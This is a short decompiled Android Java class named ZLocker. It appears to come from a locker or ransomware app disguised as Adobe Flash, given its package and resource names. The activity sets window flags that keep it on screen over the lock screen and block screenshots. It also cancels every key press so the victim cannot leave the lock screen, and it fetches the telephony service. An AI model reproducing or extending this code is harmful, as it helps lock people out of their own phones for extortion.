package com.adobe.packages;

import android.app.Activity;
import android.os.Bundle;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import com.adobe.flash.R;

public class ZLocker extends Activity {
    TelephonyManager telephonyManager = ((TelephonyManager) getSystemService("phone"));

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        super.onAttachedToWindow();
        setContentView(R.layout.activity_lock);
    }

    public void onAttachedToWindow() {
        getWindow().addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);
        getWindow().addFlags(32768);
        getWindow().addFlags(8192);
        getWindow().addFlags(4194304);
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return false;
    }
}
